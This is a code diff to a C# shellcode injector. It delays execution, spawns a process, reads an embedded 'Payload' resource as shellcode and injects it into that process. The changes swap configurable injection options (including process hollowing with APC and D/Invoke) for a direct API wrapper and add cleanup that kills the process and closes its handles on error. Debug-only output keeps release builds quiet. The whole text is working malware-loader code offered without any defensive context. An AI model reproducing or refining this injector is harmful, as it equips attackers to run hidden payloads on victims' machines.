@@ -20,12 +20,13 @@ namespace EntryPoint
 #if DEBUG
             Console.WriteLine("Running Inject.");
 #endif
+            ProcessCreationResult procResult = null;
 
             //var apitype = APIAccessType.PInvoke;
             //var injectMethod = InjectionMethod.CreateRemoteThread;
 
-            var apitype = APIAccessType.DInvoke;
-            var injectMethod = InjectionMethod.ProcessHollowingWithAPC;
+            //var apitype = APIAccessType.DInvoke;
+            //var injectMethod = InjectionMethod.ProcessHollowingWithAPC;
             //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} RunningInjector{Environment.NewLine}");
 
             try
@@ -52,7 +53,7 @@ namespace EntryPoint
 
                 Thread.Sleep(delay * 1000);
 
-                var wrapper = PInvokeAPIWrapper.CreateInstance(apitype);
+
 
                 var creationParms = new ProcessCreationParameters()
                 {
@@ -64,7 +65,7 @@ namespace EntryPoint
 #if DEBUG
                 Console.WriteLine($"[>] Executing {app}...");
 #endif
-                var procResult = wrapper.CreateProcess(creationParms);
+                procResult = APIWrapper.CreateProcess(creationParms);
 
 #if DEBUG
                 Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
@@ -74,17 +75,27 @@ namespace EntryPoint
 
                 byte[] shellcode = Inject.Properties.Resources.Payload;
 
-                wrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, injectMethod);
+                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
             }
             catch (Exception e)
             {
 #if DEBUG
                 Console.WriteLine(e.ToString());
 #endif
+                if (procResult != null)
+                    APIWrapper.KillProcess(procResult.ProcessId);
+
                 //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} : Error => {e.ToString()}{Environment.NewLine}");
             }
             finally
             {
+                if (procResult != null)
+                {
+                    APIWrapper.CloseHandle(procResult.ProcessHandle);
+                    APIWrapper.CloseHandle(procResult.ThreadHandle);
+                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
+                }
+
                 //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
             }
 
